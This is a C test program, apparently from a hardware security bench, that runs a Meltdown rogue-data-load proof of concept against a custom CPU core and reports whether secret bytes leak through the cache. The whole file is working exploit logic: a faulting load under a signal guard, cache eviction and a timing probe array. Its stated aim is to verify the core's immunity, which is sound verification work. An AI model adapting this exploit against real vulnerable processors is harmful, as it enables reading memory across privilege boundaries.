/**
 * spectre-v3-meltdown: Rogue Data Load (Meltdown), multi-byte attempt.
 *
 * Meltdown transiently loads data from a permission-denied (but mapped) page
 * before the fault is taken, forwarding the secret to a dependent cache
 * access.  The core performs translation and permission checks BEFORE allocating
 * a cache miss (rapt_l1d.sv) and takes exceptions precisely at commit, so a
 * faulting load is not expected to forward data or fill the cache.  This PoC
 * maps a page, writes a secret, revokes access (PROT_NONE), then attempts the
 * transient rogue load under a SIGSEGV recovery guard and checks whether any
 * secret byte leaked into the cache.  A live positive control confirms the
 * probe channel; the expected verdict is structural immunity.
 */
#include "bench.h"

#if defined(__linux__)
#include <sys/mman.h>
#include <signal.h>
#include <setjmp.h>
#endif

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 60
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif

static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));
static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";

#if defined(__linux__)
static sigjmp_buf fault_jmp;
static volatile int fault_armed;
static void segv_handler(int sig) {
  (void)sig;
  if (fault_armed)
    siglongjmp(fault_jmp, 1);
  signal(SIGSEGV, SIG_DFL);
  raise(SIGSEGV);
}
#endif

int main(void) {
  if (sc_time_selfcheck("spectre-v3-meltdown") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spectre-v3-meltdown ERROR reason=evict\n");
    return 1;
  }
#if !defined(__linux__)
  printf("SCRESULT spectre-v3-meltdown SKIP reason=linux-only-mmap\n");
  return 0;
#else
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  uint32_t R = SECURITY_ATTACK_ROUNDS;

  uint8_t *secret_page = mmap(NULL, SC_PAGE_BYTES, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (secret_page == MAP_FAILED) {
    printf("SCRESULT spectre-v3-meltdown ERROR reason=mmap\n");
    return 1;
  }
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    secret_page[i] = (uint8_t)secret_str[i];

  /* Positive control: architectural read of the secret (access still open). */
  int expect = (uint8_t)secret_str[0];
  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    volatile uint8_t t = probe_array[(uintptr_t)secret_page[0] * SC_PROBE_STRIDE];
    (void)t;
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0xb0b + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[expect] >= R / 2;

  /* Revoke access: the page is mapped but permission-denied. */
  mprotect(secret_page, SC_PAGE_BYTES, PROT_NONE);
  struct sigaction sa, old;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = segv_handler;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGSEGV, &sa, &old);

  int matched = 0;
  uint32_t faults = 0;
  printf("[spectre-v3-meltdown] attempting %d-byte rogue load:\n",
         SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    sc_score_t atk;
    sc_score_reset(&atk);
    for (uint32_t r = 0; r < R; r++) {
      sc_evict_capacity(&g);
      sc_fence();
      fault_armed = 1;
      if (sigsetjmp(fault_jmp, 1) == 0) {
        /* transient rogue load: faults architecturally; may leak transiently */
        volatile uint8_t s = secret_page[i];
        volatile uint8_t t = probe_array[(uintptr_t)s * SC_PROBE_STRIDE];
        (void)t;
      } else {
        faults++;
      }
      fault_armed = 0;
      sc_fence();
      sc_probe_array(probe_array, &g, &atk, 0x2222 + r);
      atk.rounds++;
    }
    int got = sc_argmax(&atk);
    int ok = (got == (uint8_t)secret_str[i] && atk.hits[got] > R / 4);
    matched += ok;
    printf("  [%2d] want=0x%02x got=0x%02x score=%u/%u %s\n",
           i, (uint8_t)secret_str[i], got, (unsigned)atk.hits[got],
           (unsigned)R, ok ? "LEAK" : "no-leak");
  }
  sigaction(SIGSEGV, &old, NULL);
  mprotect(secret_page, SC_PAGE_BYTES, PROT_READ | PROT_WRITE);
  munmap(secret_page, SC_PAGE_BYTES);

  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT spectre-v3-meltdown %s pos=%d faults=%u rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok,
         (unsigned)faults, (unsigned)R);
  printf("SCRESULT spectre-v3-meltdown-multibit %s pos=%d leaked=%d/%d\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN);
  if (multibit_ok)
    printf("[spectre-v3-meltdown] VULNERABLE: rogue data load leak\n");
  else if (!pos_ok)
    printf("[spectre-v3-meltdown] INCONCLUSIVE: positive control failed\n");
  else
    printf("[spectre-v3-meltdown] NOT VULNERABLE: permission checked before "
           "cache allocation; faulting load forwards no data (immune)\n");
  return 0;
#endif
}